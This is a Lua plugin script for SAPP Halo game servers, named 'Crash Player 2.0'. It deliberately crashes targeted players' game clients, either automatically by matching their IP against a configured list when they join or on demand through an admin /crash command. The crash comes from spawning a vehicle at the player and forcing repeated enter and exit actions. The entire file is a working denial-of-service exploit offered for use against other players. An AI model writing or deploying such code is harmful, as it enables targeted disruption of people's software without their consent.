--[[
--=====================================================================================================--
Script Name: Crash Player 2.0 (utility), for SAPP (PC & CE)
Description: Crash someone automatically when they join the server (based on IP comparisons)
            
            * Ability to Crash someone (anyone) on demand with the /crash command.
            - Command Syntax: /crash [player id]

Copyright (c) 2016-2019, Jericho Crosby <jericho.crosby227@gmail.com>
* Notice: You can use this document subject to the following conditions:
https://github.com/Chalwk77/Halo-Scripts-Phasor-V2-/blob/master/LICENSE

* Written by Jericho Crosby (Chalwk)

- This script is included in the Velocity Multi-Mod with many improvements.
--=====================================================================================================--
]]--

api_version = "1.11.0.0"

-- Configuration [start] -------------
local base_command = "crash"
local privilege_level = 4 -- Minimum admin level require to execute /base_command
local ip_table = {
    
    -- Note: Do not insert the player's PORT.
    
    "127.0.0.1",
    "000.000.000.000",
    "000.000.000.000",
    -- repeat the structure to add more entries 
    "000.000.000.000",
}
-- Configuration [end] -------------

local mod, trigger, vehicles, lower = { }, { }, { }, string.lower
local available_vehicles

function OnScriptLoad()
    register_callback(cb['EVENT_GAME_START'], "OnGameStart")
end

function OnGameStart()
    safe_read(true)
    available_vehicles = { }
    if map_has_vehicles() then
        register_callback(cb['EVENT_PREJOIN'], "OnPlayerPrejoin")
        register_callback(cb['EVENT_COMMAND'], "OnServerCommand")
        register_callback(cb['EVENT_GAME_END'], "OnGameEnd")
        register_callback(cb['EVENT_TICK'], "OnTick")
    else
        unregister_callback(cb['EVENT_PREJOIN'])
        unregister_callback(cb['EVENT_COMMAND'])
        unregister_callback(cb['EVENT_GAME_END'])
        unregister_callback(cb['EVENT_TICK'])
        error('Crash Player 2.0 cannot be used on this map.')
    end
    safe_read(false)
end

function OnGameEnd()
    for k,_ in pairs(available_vehicles) do
        available_vehicles[k] = nil
    end
end

function OnScriptUnload()
    --
end

local function checkAccess(e)
    if (e ~= -1 and e >= 1 and e < 16) then
        if (tonumber(get_var(e, "$lvl"))) >= privilege_level then
            return true
        else
            rprint(e, "Command failed. Insufficient Permission.")
            return false
        end
    else
        cprint("You cannot execute this command from the console.", 4 + 8)
        return false
    end
end

local function isOnline(t, e)
    if (t) then
        if (t > 0 and t < 17) then
            if player_present(t) then
                return true
            else
                rprint(e, "Command failed. Player not online.")
                return false
            end
        else
            rprint(e, "Invalid player id. Please enter a number between 1-16")
        end
    end
end

local function cmdself(t, e)
    if (t) then
        if tonumber(t) == tonumber(e) then
            rprint(e, "You cannot execute this command on yourself.")
            return true
        end
    end
end

function OnTick()
    for i = 1,16 do
        if player_present(i) then
            if trigger[i] and player_alive(i) then
                trigger[i] = false
                Crash(i, get_var(i, "$name"))
            end
        end
    end
end

function OnServerCommand(PlayerIndex, Command)
    local command, args = cmdsplit(Command)
    local executor = tonumber(PlayerIndex)
    
    local players = { }
    
    if (command == lower(base_command)) then
        if (checkAccess(executor)) then
            if (args[1] ~= nil) and (args[1]:match("%d+")) then
                local TargetID = tonumber(args[1])
                if isOnline(TargetID, executor) then
                    if not cmdself(TargetID, executor) then
                        players.eid = tonumber(get_var(executor, "$n"))
                        players.tid = tonumber(get_var(TargetID, "$n"))
                        players.tn = get_var(TargetID, "$name")
                        mod:CommandCrash(players)
                    end
                end
            else
                rprint(executor, "Invalid syntax. Usage: /" .. base_command .. " [player id]")
            end
        end
        return false
    end
end

function mod:CommandCrash(params)
    local params = params or {}

    local eid = params.eid or nil
    local tid = params.tid or nil
    local tn = params.tn or nil

    local player_object = get_dynamic_player(tid)
    if player_object ~= 0 then
        trigger[tid] = true
        rprint(eid, "You have crashed " .. tn .. "'s game client")
    end
    
end

function Crash(target, name)
    local player_object = get_dynamic_player(target)
    
    if (player_object ~= 0) then
    
        local x, y, z = read_vector3d(player_object + 0x5C)
        local num = rand(1, #available_vehicles)
        
        for k,v in pairs(available_vehicles) do
            if k == num then
            
                local vehicle_id = spawn_object("vehi", v, x, y, z)
                local veh_obj = get_object_memory(vehicle_id)
                
                if (veh_obj ~= 0) then
                    for j = 0, 20 do
                        enter_vehicle(vehicle_id, target, j)
                        exit_vehicle(target)
                    end
                    destroy_object(vehicle_id)
                end
                cprint("Crashed " .. name .. "'s game client", 4+8)
                break
            end
        end
    end
    return false
end

function OnPlayerPrejoin(PlayerIndex)
    trigger[PlayerIndex] = nil
    
    local ip, found = get_var(PlayerIndex, "$ip"):match("(%d+.%d+.%d+.%d+)"), nil
    for _, v in pairs(ip_table) do
        if (ip == v) then
            found = true
            break
        end
    end
    
    if (found) then
        trigger[PlayerIndex] = true
    end
end

function cmdsplit(str)
    local subs = {}
    local sub = ""
    local ignore_quote, inquote, endquote
    for i = 1, string.len(str) do
        local bool
        local char = string.sub(str, i, i)
        if char == " " then
            if (inquote and endquote) or (not inquote and not endquote) then
                bool = true
            end
        elseif char == "\\" then
            ignore_quote = true
        elseif char == "\"" then
            if not ignore_quote then
                if not inquote then
                    inquote = true
                else
                    endquote = true
                end
            end
        end

        if char ~= "\\" then
            ignore_quote = false
        end

        if bool then
            if inquote and endquote then
                sub = string.sub(sub, 2, string.len(sub) - 1)
            end

            if sub ~= "" then
                table.insert(subs, sub)
            end
            sub = ""
            inquote = false
            endquote = false
        else
            sub = sub .. char
        end

        if i == string.len(str) then
            if string.sub(sub, 1, 1) == "\"" and string.sub(sub, string.len(sub), string.len(sub)) == "\"" then
                sub = string.sub(sub, 2, string.len(sub) - 1)
            end
            table.insert(subs, sub)
        end
    end

    local cmd = subs[1]
    local args = subs
    table.remove(args, 1)

    return cmd, args
end

function map_has_vehicles()
    local bool
    
    for k,v in pairs(vehicles) do
        if (lookup_tag("vehi", vehicles[k]) ~= 0) then
            table.insert(available_vehicles, v)
            bool = true
        end
    end
    return bool
end

-- Do not touch unless you know what you're doing.
vehicles = {
    "vehicles\\wraith\\wraith" ,
    "vehicles\\pelican\\pelican" ,
    "vehicles\\banshee\\banshee_mp" ,
    "vehicles\\c gun turret\\c gun turret_mp" ,
    "vehicles\\ghost\\ghost_mp" ,
    "vehicles\\scorpion\\scorpion_mp" ,
    "vehicles\\rwarthog\\rwarthog" ,
    "vehicles\\warthog\\mp_warthog" ,
}
